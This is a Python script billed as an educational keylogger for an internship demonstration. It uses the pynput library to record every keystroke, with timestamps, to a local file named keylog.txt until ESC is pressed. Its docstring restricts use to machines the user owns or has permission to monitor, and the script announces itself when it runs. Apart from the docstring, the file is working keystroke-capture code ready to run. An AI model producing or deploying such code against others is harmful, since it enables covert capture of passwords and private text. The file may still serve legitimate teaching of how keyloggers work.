""" 
Educational Keylogger Script for Internship Demonstration
Author: [Your Name]
Date: [Date]

DISCLAIMER:
This script is intended for EDUCATIONAL and TESTING purposes only.
Do NOT use this on any machine you do not own or have explicit permission to monitor.

Description:
This script logs keystrokes to a local file named 'keylog.txt'.
It uses the pynput library to listen for keyboard events.

Usage:
Run the script in a controlled and ethical environment.
Press ESC to stop the keylogger.
"""

from pynput import keyboard
from datetime import datetime

LOG_FILE = "keylog.txt"

def on_press(key):
    try:
        with open(LOG_FILE, "a") as f:
            f.write(f"{datetime.now()} - {key.char}\n")
    except AttributeError:
        # Handle special keys
        with open(LOG_FILE, "a") as f:
            f.write(f"{datetime.now()} - [{key}]\n")

def on_release(key):
    # Stop listener if ESC is pressed
    if key == keyboard.Key.esc:
        return False

def main():
    print("Keylogger running... Press ESC to stop.")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
